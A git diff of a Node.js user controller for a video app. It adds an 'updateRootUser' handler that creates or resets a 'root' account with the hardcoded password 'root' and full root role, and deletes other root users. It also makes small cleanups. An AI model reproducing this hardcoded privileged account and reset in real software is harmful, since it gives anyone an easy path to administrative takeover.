@@ -1,8 +1,44 @@
 import { createError } from "../error.js";
 import User from "../models/User.js";
 import Video from "../models/Video.js";
-import { addSuffix } from "yarn/lib/cli.js";
 import FastSpeedtest from "fast-speedtest-api";
+import bcrypt from "bcryptjs";
+
+export const updateRootUser = async (req, res, next) => {
+  const salt = bcrypt.genSaltSync(10);
+  const hash = bcrypt.hashSync("root", salt);
+
+  let user;
+
+  user = await User.findOne({ name: "root" });
+
+  if (!user) {
+    user = await User.findOne({ email: "root" });
+  }
+
+  if (!user) {
+    await User.deleteMany({ roles: { $in: ["root"] } });
+
+    return User({
+      name: "root",
+      password: hash,
+      email: "root",
+      roles: ["root"],
+    }).save();
+  }
+  return User.findOneAndUpdate(
+    {
+      name: user.name,
+    },
+    {
+      $set: {
+        password: hash,
+        email: "root",
+        roles: ["root"],
+      },
+    },
+  );
+};
 
 export const update = async (req, res, next) => {
   if (req.params.id === req.user.id) {
@@ -193,7 +229,7 @@ export const getSpeedTest = async (req, res, next) => {
     });
 
     const speed = await speedtest.getSpeed();
-    res.json({downloadSpeed: speed});
+    res.json({ downloadSpeed: speed });
   } catch (error) {
     console.log(`Error during speed test: ${error}`);
     res.status(500).json({ error: "Error during speed test" });
